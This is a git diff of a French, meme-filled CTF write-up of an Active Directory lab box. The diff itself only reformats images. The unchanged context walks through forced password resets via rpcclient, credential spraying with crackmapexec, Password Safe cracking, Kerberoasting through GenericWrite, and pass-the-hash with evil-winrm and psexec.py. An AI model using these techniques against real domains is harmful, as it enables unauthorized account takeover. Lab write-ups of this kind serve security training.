@@ -152,6 +152,7 @@ net user michael michael /domain
 ```
 
 Yes sir Le mot de passe de `michael` est maintenant... `michael`. (Ouais j’ai pas fait dans l’originalité, mais ça marche.)
+
 ![Cat Table](../assets/memes/CatTable.png)
 
 ---
@@ -164,7 +165,7 @@ Je teste le tout avec `crackmapexec` pour voir si les identifiants passent :
 crackmapexec smb 10.10.11.42 -u 'michael' -p 'michael'
 ```
 
-Et là, le feu vert :![La Patte de l'expert](../assets/memes/FeuVert.png)
+Et là, le feu vert :![La Patte de l'expert](../assets/memes/FeuVert.png){ width="600" }
 
 ```
 [+] administrator.htb\michael:michael
@@ -182,7 +183,8 @@ Parfait, voici la suite de ton write-up, toujours dans ton style familier et cla
 
 Comme j’ai encore BloodHound sous les yeux, je check le node de **michael**, histoire de voir s’il peut m’ouvrir d’autres portes. Et boum : il a un **FDOC** sur **benjamin** avec le droit **ForceChangePassword**.
 
-🧠 Petit rappel : `ForceChangePassword` = je peux modifier le mot de passe d’un user **sans même avoir besoin de l’ancien**. Ultra pratique.![NerdCat](../assets/memes/NerdCat.png)
+🧠 Petit rappel : `ForceChangePassword` = je peux modifier le mot de passe d’un user **sans même avoir besoin de l’ancien**. Ultra pratique.
+![NerdCat](../assets/memes/NerdCat.png){ width="300" }
 
 
 ---
@@ -200,8 +202,11 @@ Une fois dedans, je balance :
 ```bash
 setuserinfo2 benjamin 23 'benjamin'
 ```
-🧠 Ici, `23` correspond au niveau de sécurité de l’opération (set password). C’est une vieille astuce avec `rpcclient` pour modifier un mot de passe d’un user sans shell, juste via RPC.![NerdCat](../assets/memes/NerdCat.png)
+🧠 Ici, `23` correspond au niveau de sécurité de l’opération (set password). C’est une vieille astuce avec `rpcclient` pour modifier un mot de passe d’un user sans shell, juste via RPC.
+
+![NerdCat](../assets/memes/NerdCat.png){ width="300" }
  
+
 Je sors de `rpcclient`, et je teste les creds fraîchement créés :
 
 ```bash
@@ -220,7 +225,10 @@ Et là, encore une fois, ça passe :
 
 ## 📁 FTP avec Benjamin – Objectif : Emily
 
-Bon, je check vite fait sur BloodHound si `benjamin` a des droits intéressants. Mais nada, il est tout claqué.![NerdCat](../assets/memes/OhHellNah.png)
+Bon, je check vite fait sur BloodHound si `benjamin` a des droits intéressants. Mais nada, il est tout claqué.
+
+![NerdCat](../assets/memes/OhHellNah.png){ width="300" }
+
 Par contre, je remarque qu’il est membre du groupe **Share Moderators**, donc je tente sa connexion sur le **FTP**.
 
 ```bash
@@ -291,7 +299,7 @@ Et là :
 ```bash
 Backup.psafe3:tekieromucho
 ```
-![Romantico](../assets/memes/Romantico.png)
+![Romantico](../assets/memes/Romantico.png){ width="300" }
 Ça sent la vibe romantique ce mot de passe mdrrrr (J'ai leak parce que trop drole)
 
 ---
@@ -300,13 +308,15 @@ Backup.psafe3:tekieromucho
 
 Je relance un petit tour dans BloodHound avec ce que j’ai récupéré. Et là je vois qu’**Emily** (dont on vient de récupérer les creds grâce au fichier) a un **GenericWrite** sur l’utilisateur **ethan**.
 
-🧠 Pour rappel : GenericWrite = je peux modifier les attributs du compte (genre, son SPN) → parfait pour un **Kerberoasting**.![NerdCat](../assets/memes/NerdCat.png)
+🧠 Pour rappel : GenericWrite = je peux modifier les attributs du compte (genre, son SPN) → parfait pour un **Kerberoasting**.![NerdCat](../assets/memes/NerdCat.png){ width="300" }
 
 ---
 
 ## 🕰️ Sync de l’heure (Kerberos oblige)
 
-Avant toute chose, il faut sync sa machine avec l’heure du DC, sinon Kerberos nous claque la porte au nez (Je parle d'experience j'me suis manger un `Clock Skew`) ![L'homme le plus aigri de France](../assets/memes/Aigri.png)
+Avant toute chose, il faut sync sa machine avec l’heure du DC, sinon Kerberos nous claque la porte au nez (Je parle d'experience j'me suis manger un `Clock Skew`)
+
+![L'homme le plus aigri de France](../assets/memes/Aigri.png)
 :
 
 ```bash
@@ -361,7 +371,7 @@ Je peux maintenant me connecter avec **Evil-WinRM** :
 evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098******
 ```
 
-Shell Admin. Et la, c'est la fin![Explosion](../assets/memes/EXPLOSION.png)
+Shell Admin. Et la, c'est la fin![Explosion](../assets/memes/EXPLOSION.png){ width="300" }
 
 Et pour les puristes, je sors aussi l’artillerie old school :
 
@@ -370,7 +380,9 @@ psexec.py administrator.htb/Administrator@10.10.11.42 -hashes :3dc553ce4b9fd20bd
 ```
 
 → SYSTEM, baby.
-![Hackeur](../assets/memes/HackerMeme.png)
+
+
+![Hackeur](../assets/memes/HackerMeme.png){ width="1000" }
 ---
 
 ## 🧩 Résumé des users / creds
